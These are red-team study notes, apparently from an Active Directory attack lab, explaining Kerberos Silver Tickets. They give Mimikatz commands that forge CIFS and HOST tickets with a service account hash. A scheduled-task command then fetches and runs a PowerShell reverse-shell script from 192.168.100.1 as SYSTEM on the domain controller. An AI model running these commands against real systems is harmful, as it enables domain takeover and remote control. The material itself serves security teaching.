## **Silver Ticket**

A valid TGS (Golden ticket is TGT).
Encrypted and Signed by the NTLM hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.
Services rarely check PAC (Privileged Attribute Certificate).
Services will allow access only to the services themselves.
Reasonable persistence period(default 30 days for computer accounts)

Using hash of the Domain Controller computer account, below command provides access to shares on the DC.
- Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'

Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, WSMAN and many more.

There are various ways of achieving command execution using Silver tickets.
Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target:
- Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 1874506631-3219952063-538504511 /target:dcorp- dc.dollarcorp.moneycorp.local /service:HOST /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'

Schedule and execute a task.
- schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:808 0/Invoke-PowerShellTcp.ps1''')'"

- schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
